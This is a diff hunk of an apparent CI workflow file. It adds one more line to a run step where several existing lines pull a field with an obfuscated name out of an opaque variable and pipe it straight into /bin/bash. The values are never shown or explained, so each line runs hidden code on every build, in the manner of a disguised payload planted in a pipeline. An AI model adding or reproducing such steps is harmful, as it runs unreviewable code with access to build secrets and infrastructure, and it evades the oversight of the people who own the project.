@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$g8833" | jq -r .k52 | /bin/bash
           echo $jgcp7 | jq -r .dt11 | /bin/bash
           echo $cz44271 | jq -r .rwym1 | /bin/bash
+          printf '%s' "$b774" | jq -r .ow59 | /bin/bash
 
       - name: Archive results
         if: always()
